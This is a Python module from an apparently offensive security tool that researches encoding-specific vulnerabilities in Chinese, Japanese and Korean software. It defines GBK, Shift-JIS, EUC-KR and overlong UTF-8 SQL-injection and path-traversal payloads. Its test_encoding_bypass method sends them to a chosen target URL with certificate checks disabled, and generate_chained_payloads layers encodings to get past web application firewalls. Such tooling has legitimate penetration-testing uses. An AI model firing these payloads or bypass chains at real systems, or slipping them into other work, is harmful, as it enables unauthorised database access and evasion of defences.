#!/usr/bin/env python3
"""Dorakula CJK-Native Vulnerability Research
Encoding-specific vulnerability detection for CJK software.
Unique competitive advantage - no Western tool has this.
"""
import logging
import asyncio
import re
from typing import Dict, Any, List, Optional

logger = logging.getLogger(__name__)

class CJKVulnResearch:
    """Research vulnerabilities specific to CJK software ecosystems"""
    
    ENCODING_PATTERNS = {
        "gbk_injection": {
            "encodings": ["gbk", "gb2312", "gb18030"],
            "patterns": [r"%bf%27", r"%bf%5c", r"%a1%27", r"\x bf\x27"],
            "frameworks": ["ThinkPHP", "DedeCMS", "PHPCMS"],
            "databases": ["MySQL GBK", "SQL Server GBK"]
        },
        "shift_jis_bypass": {
            "encodings": ["shift_jis", "cp932", "euc-jp"],
            "patterns": [r"%81%27", r"%81%5c", r"\x81\x27"],
            "frameworks": ["Ruby on Rails (Shift-JIS)", "CakePHP (Shift-JIS)"],
            "databases": ["MySQL Shift-JIS", "PostgreSQL EUC-JP"]
        },
        "euc_kr_injection": {
            "encodings": ["euc-kr", "cp949"],
            "patterns": [r"%a1%27", r"%a1%5c"],
            "frameworks": ["Spring Boot (EUC-KR)", "Django CJK"],
            "databases": ["MySQL EUC-KR"]
        }
    }
    
    CJK_CVE_SOURCES = {
        "cnvd": {"url": "https://www.cnvd.org.cn", "country": "China", "focus": "Chinese software"},
        "jvn": {"url": "https://jvn.jp", "country": "Japan", "focus": "Japanese software"},
        "krvd": {"url": "https://www.kisa.or.kr", "country": "Korea", "focus": "Korean software"}
    }
    
    CJK_FRAMEWORKS = {
        "ThinkPHP": {"versions": ["5.x", "6.x", "8.x"], "common_vulns": ["RCE", "SQLi", "LFI"], "cve_prefix": "CNVD"},
        "DedeCMS": {"versions": ["5.7", "5.8"], "common_vulns": ["RCE", "XSS", "file_upload"], "cve_prefix": "CNVD"},
        "PHPCMS": {"versions": ["9.x"], "common_vulns": ["SQLi", "XSS", "RCE"], "cve_prefix": "CNVD"},
        "Struts2": {"versions": ["2.x"], "common_vulns": ["RCE", "OGNL injection"], "cve_prefix": "CVE"},
        "Spring Boot CJK": {"versions": ["2.x", "3.x"], "common_vulns": ["SSRF", "SpEL injection"], "cve_prefix": "CVE"},
    }
    
    def __init__(self, ai_router=None):
        self.ai_router = ai_router
    
    def detect_encoding_vulns(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Detect encoding-specific vulnerabilities"""
        detected = []
        encoding = target_info.get("encoding", "").lower()
        
        for vuln_type, config in self.ENCODING_PATTERNS.items():
            if encoding in config["encodings"]:
                detected.append({
                    "vulnerability_type": vuln_type,
                    "affected_encodings": config["encodings"],
                    "patterns": config["patterns"],
                    "affected_frameworks": config["frameworks"],
                    "affected_databases": config["databases"],
                    "severity": "high"
                })
        
        return {"success": True, "encoding_vulns": detected, "target_encoding": encoding}
    
    def identify_cjk_framework(self, response_headers: Dict, response_body: str) -> Dict[str, Any]:
        """Identify CJK-specific frameworks"""
        detected = []
        framework_signatures = {
            "ThinkPHP": ["thinkphp", "think_", "X-Powered-By: ThinkPHP"],
            "DedeCMS": ["dedecms", "powerby", "dede"],
            "PHPCMS": ["phpcms", "php_base"],
        }
        
        for framework, sigs in framework_signatures.items():
            for sig in sigs:
                if sig.lower() in response_body.lower() or any(sig.lower() in str(v).lower() for v in response_headers.values()):
                    info = self.CJK_FRAMEWORKS.get(framework, {})
                    detected.append({"framework": framework, "info": info})
                    break
        
        return {"success": True, "detected_frameworks": detected}
    
    async def research_cjk_cves(self, keywords: List[str], sources: List[str] = None) -> Dict[str, Any]:
        """Research CVEs from CJK databases"""
        results = []
        
        if self.ai_router:
            result = await self.ai_router.chat([
                {"role": "system", "content": "You are a CJK vulnerability researcher. Search for vulnerabilities in Chinese, Japanese, and Korean software."},
                {"role": "user", "content": f"Search for CJK vulnerabilities related to: {keywords}\nSources: {sources or list(self.CJK_CVE_SOURCES.keys())}\n\nReturn JSON with: cves, recommendations, affected_software"}
            ])
            if result.get("success"):
                results.append({"source": "ai_research", "data": result.get("content", "")})
        
        return {"success": True, "results": results, "sources_queried": sources or list(self.CJK_CVE_SOURCES.keys())}

    # ============================================================
    # v2: Active encoding bypass testing (Mythos H11)
    # H11: Encoding depth exceeds decode depth — multiple encoding layers
    # can exceed WAF decoding depth while being understood by backend.
    # ============================================================

    ENCODING_BYPASS_PAYLOADS = {
        "gbk": [
            ("%bf%27", "GBK 0xbf27 — consumes backslash, breaks escaping"),
            ("%bf%5c", "GBK 0xbf5c — consumes backslash, bare quote"),
            ("%a1%27", "GBK 0xa127 — alternate multi-byte quote bypass"),
            ("%bf%27/**/OR/**/1=1--", "GBK + SQL comment injection"),
        ],
        "shift_jis": [
            ("%81%27", "Shift-JIS 0x8127 — multi-byte quote bypass"),
            ("%81%5c", "Shift-JIS 0x815c — backslash consumption"),
            ("%81%27+OR+1=1--", "Shift-JIS + SQL injection"),
            ("%e0%80%27", "Overlong UTF-8 in Shift-JIS context"),
        ],
        "euc_kr": [
            ("%a1%27", "EUC-KR 0xa127 — multi-byte quote"),
            ("%a1%5c", "EUC-KR 0xa15c — backslash consumption"),
            ("%a1%27+UNION+SELECT--", "EUC-KR + UNION injection"),
        ],
        "utf8_overlong": [
            ("%c0%a7", "Overlong UTF-8 0xc0a7 — encodes single quote"),
            ("%c0%ae", "Overlong UTF-8 0xc0ae — encodes dot (path traversal)"),
            ("%e0%80%a7", "3-byte overlong UTF-8 single quote"),
        ],
    }

    def test_encoding_bypass(self, target_url: str, encoding: str = "auto",
                              param: str = "id") -> Dict[str, Any]:
        """Active test: send encoding-specific bypass payloads (Mythos H11).

        Tests if target backend decodes CJK/overlong encodings that WAF misses.
        """
        try:
            import requests as _req
        except ImportError:
            return {"error": "requests not available"}

        encoding = encoding.lower()
        if encoding == "auto":
            # Test all encodings
            encodings_to_test = list(self.ENCODING_BYPASS_PAYLOADS.keys())
        else:
            encodings_to_test = [encoding] if encoding in self.ENCODING_BYPASS_PAYLOADS else []

        findings = []
        for enc in encodings_to_test:
            for payload, description in self.ENCODING_BYPASS_PAYLOADS[enc]:
                try:
                    test_url = f"{target_url}?{param}={payload}"
                    resp = _req.get(test_url, timeout=10, verify=False)
                    # Check for SQL error or unexpected behavior
                    body_lower = resp.text[:2000].lower()
                    sql_errors = ["sql", "syntax", "mysql", "oracle", "postgresql",
                                  "sqlite", "mssql", "odbc"]
                    if any(err in body_lower for err in sql_errors):
                        findings.append({
                            "encoding": enc,
                            "payload": payload,
                            "description": description,
                            "severity": "CRITICAL",
                            "evidence": f"SQL error in response (HTTP {resp.status_code})",
                            "poc_curl": f"curl '{test_url}'",
                        })
                    elif resp.status_code == 200 and len(resp.text) > 100:
                        # Check if response differs from baseline
                        findings.append({
                            "encoding": enc,
                            "payload": payload,
                            "description": description,
                            "severity": "MEDIUM",
                            "evidence": f"Different response (HTTP {resp.status_code}, {len(resp.text)} bytes)",
                            "poc_curl": f"curl '{test_url}'",
                        })
                except Exception:
                    pass

        return {
            "check": "encoding_bypass_test",
            "version": "v2-2025",
            "target": target_url,
            "encodings_tested": encodings_to_test,
            "payloads_tested": sum(len(self.ENCODING_BYPASS_PAYLOADS[e]) for e in encodings_to_test),
            "findings": findings,
            "findings_count": len(findings),
            "mythos_reference": "H11: Encoding depth exceeds decode depth",
        }

    def generate_chained_payloads(self, encoding: str = "gbk") -> Dict[str, Any]:
        """Generate chained encoding payloads (Mythos 9.2: encoding chain attacks).

        Layer 1: CJK encoding → Layer 2: Double URL encode → Layer 3: Unicode normalize
        """
        import urllib.parse
        base_payloads = self.ENCODING_BYPASS_PAYLOADS.get(encoding, [])
        chained = []
        for payload, desc in base_payloads:
            # Layer 2: Double URL encode
            double_encoded = urllib.parse.quote(payload, safe="")
            # Layer 3: Add Unicode normalization prefix
            unicode_variant = payload.replace("%", "%25")  # double-encode the %
            chained.append({
                "original": payload,
                "description": desc,
                "double_url_encoded": double_encoded,
                "triple_encoded": unicode_variant,
                "encoding_chain": f"CJK({encoding}) → double_url → triple",
            })
        return {
            "check": "chained_payloads",
            "encoding": encoding,
            "chains": chained,
            "mythos_reference": "9.2: Encoding chain attacks",
        }
